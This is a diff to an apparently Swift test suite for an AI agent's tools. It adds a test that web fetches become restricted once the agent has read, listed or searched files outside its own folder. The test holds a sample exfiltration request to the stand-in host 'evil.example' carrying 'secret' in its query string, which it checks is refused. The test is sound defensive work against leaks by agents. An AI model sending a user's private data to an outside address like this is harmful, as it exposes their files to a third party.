@@ -154,6 +154,7 @@ struct AgentToolsTests {
         await aRefusalLeavesNoEffect(folder: folder, memory: memory)
         await thePlanToolOnlyShows(folder: folder, memory: memory)
         await documentsReadByKind(folder: folder, memory: memory)
+        await personalReadsNarrowTheWeb(folder: folder, outside: outside, skill: skill, memory: memory)
 
         print("\(passes) passed, \(failures) failed")
         if failures > 0 { exit(1) }
@@ -483,6 +484,52 @@ extension AgentToolsTests {
             consent: { _ in true }, documents: DocumentTextService(executable: URL(fileURLWithPath: "/none")))
         let unread = await lost.run(AIToolCall(id: "r", name: AgentToolbox.readFile, arguments: #"{"path":"docs/report.pdf"}"#))
         expect(unread.isError && unread.content.contains("document reader is missing"), "no helper, said so")
+    }
+
+    /// After the user's own files, notes or screen, a fetch opens only what the turn was given.
+    static func personalReadsNarrowTheWeb(
+        folder: String, outside: String, skill: AgentSkill, memory: URL
+    ) async {
+        let web = AgentWebScope(unattended: false)
+        let agent = AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [skill],
+            memoryURL: memory, consent: { _ in true }, web: web)
+        func run(_ name: String, _ arguments: String) async -> AIToolResult {
+            await agent.run(AIToolCall(id: name, name: name, arguments: arguments))
+        }
+        _ = await run(AgentToolbox.readFile, #"{"path":"src/a.txt"}"#)
+        _ = await run(AgentToolbox.readFile, "{\"path\":\"\(skill.directory)/SKILL.md\"}")
+        _ = await run(AgentToolbox.listDirectory, #"{"path":"src"}"#)
+        _ = await run(AgentToolbox.readFile, "{\"path\":\"\(outside)/missing.txt\"}")
+        expect(!web.isRestricted, "reading the folder, a skill or nothing at all leaves the web open")
+        let secret = await run(AgentToolbox.readFile, "{\"path\":\"\(outside)/secret.txt\"}")
+        expect(!secret.isError && web.isRestricted, "a file beyond the folder narrows it")
+        let refused = await run(AgentToolbox.webFetch, #"{"url":"https://evil.example/c?d=secret"}"#)
+        expect(
+            refused.isError
+                && refused.content == WebPageTool.outOfAgentScope(
+                    URL(string: "https://evil.example/c?d=secret")!, unattended: false),
+            "so a page the turn was not given is refused before any request, got \(refused.content)")
+
+        let listing = AgentWebScope(unattended: false)
+        let lister = AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [],
+            memoryURL: memory, consent: { _ in true }, web: listing)
+        _ = await lister.run(AIToolCall(id: "l", name: AgentToolbox.listDirectory, arguments: "{\"path\":\"\(outside)\"}"))
+        expect(listing.isRestricted, "listing a folder beyond its own narrows it too")
+        let searching = AgentWebScope(unattended: false)
+        let searcher = AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder, access: .fullAccess), skills: [],
+            memoryURL: memory, consent: { _ in true }, web: searching)
+        _ = await searcher.run(AIToolCall(
+            id: "s", name: AgentToolbox.searchFiles, arguments: "{\"pattern\":\"secret\",\"path\":\"\(outside)\"}"))
+        expect(searching.isRestricted, "and so does searching there")
+
+        let invalid = await AgentToolExecutor(
+            profile: AgentProfile(name: "T", directory: folder), skills: [], memoryURL: memory,
+            consent: { _ in true }
+        ).run(AIToolCall(id: "w", name: AgentToolbox.webFetch, arguments: #"{"url":"https://me:pw@example.com/"}"#))
+        expect(invalid.isError && invalid.content.contains("no user name or password"), "an address with a user")
     }
 
     /// One page a line of text; nil is a scanned page, an image with no text layer.
